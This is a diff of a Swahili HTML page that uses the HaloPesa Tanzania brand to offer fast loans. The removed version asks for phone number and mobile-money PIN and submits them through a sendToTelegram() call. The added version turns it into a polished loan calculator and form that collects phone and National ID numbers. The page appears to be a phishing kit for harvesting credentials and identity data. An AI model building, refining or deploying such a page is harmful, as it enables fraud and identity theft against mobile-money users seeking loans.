@@ -1,49 +1,135 @@
+
 <!DOCTYPE html>
-<html lang="en">
+<html lang="sw">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MKOPO WA HALOPESA</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>HaloPesa Tanzania</title>
 
-    <link rel="stylesheet" href="style.css">
+  <link rel="stylesheet" href="style.css">
 </head>
-
 <body>
 
-<div class="container">
+  <!-- HEADER -->
+  <header class="topbar">
+    <div class="menu">☰</div>
 
-    <h1>MKOPO WA HALOPESA</h1>
+    <div class="logo">
+      <span class="orange">Halo</span><span class="yellow">Pesa</span>
+    </div>
+  </header>
 
-    <!-- Amount -->
-    <input type="number"
-           id="amount"
-           placeholder="Kiasi cha Mkopo">
+  <!-- MAIN CARD -->
+  <div class="container">
 
-    <!-- Duration -->
-    <select id="duration">
-        <option>Siku 30</option>
-        <option>Siku 14</option>
-        <option>Siku 7</option>
-    </select>
+    <div class="card">
 
-    <!-- Phone -->
-    <input type="text"
-           id="phone"
-           placeholder="Namba ya Simu">
+      <h1>Pata Mkopo Wako Haraka</h1>
+      <p class="subtitle">
+        Idhini ya haraka • Riba nafuu • Muda rahisi
+      </p>
 
-    <!-- PIN -->
-    <input type="password"
-           id="pin"
-           placeholder="PIN">
+      <!-- LOAN CALCULATOR -->
+      <div class="loan-box">
 
-    <!-- Button -->
-    <button onclick="sendToTelegram()">
+        <div class="label-row">
+          <span>Kiasi cha Mkopo</span>
+          <strong id="amountText">TSh 100,000</strong>
+        </div>
+
+        <input type="range"
+               min="10000"
+               max="1000000"
+               value="100000"
+               step="10000"
+               id="loanAmount">
+
+        <div class="range-labels">
+          <span>TSh 10K</span>
+          <span>TSh 1M</span>
+        </div>
+
+        <br>
+
+        <div class="label-row">
+          <span>Muda wa Mkopo</span>
+          <strong id="monthText">Miezi 12</strong>
+        </div>
+
+        <input type="range"
+               min="1"
+               max="24"
+               value="12"
+               id="loanMonths">
+
+        <div class="range-labels">
+          <span>Mwezi 1</span>
+          <span>Miezi 24</span>
+        </div>
+
+        <!-- MONTHLY PAYMENT -->
+        <div class="payment-box">
+          <p>Malipo ya Kila Mwezi</p>
+          <h2 id="monthlyPayment">TSh 9,500</h2>
+        </div>
+
+      </div>
+
+      <button class="apply-btn" onclick="openForm()">
         OMBA SASA
-    </button>
+      </button>
 
-</div>
+    </div>
 
-<script src="script.js"></script>
+  </div>
 
+  <!-- APPLICATION FORM -->
+  <div class="form-container" id="formPage">
+
+    <div class="form-card">
+
+      <h1>Maombi ya Mkopo</h1>
+      <p class="step">Hatua 1 ya 3</p>
+
+      <form id="loanForm">
+
+        <label>Aina ya Mkopo</label>
+        <select required>
+          <option>Mkopo wa Biashara</option>
+          <option>Mkopo wa Dharura</option>
+          <option>Mkopo wa Elimu</option>
+        </select>
+
+        <label>Kiasi cha Mkopo (TSh)</label>
+        <input type="number" placeholder="100000" required>
+
+        <label>Muda wa Mkopo</label>
+        <select required>
+          <option>Miezi 3</option>
+          <option>Miezi 6</option>
+          <option>Miezi 12</option>
+          <option>Miezi 24</option>
+        </select>
+
+        <label>Namba ya Simu</label>
+        <input type="tel" placeholder="07XXXXXXXX" required>
+
+        <label>Namba ya Kitambulisho</label>
+        <input type="text" placeholder="National ID" required>
+
+        <label>Madhumuni ya Mkopo</label>
+        <textarea placeholder="Elezea matumizi ya mkopo wako"></textarea>
+
+        <button type="submit" class="submit-btn">
+          TUMA MAOMBI
+        </button>
+
+      </form>
+
+    </div>
+
+  </div>
+
+  <script src="script.js"></script>
 </body>
 </html>
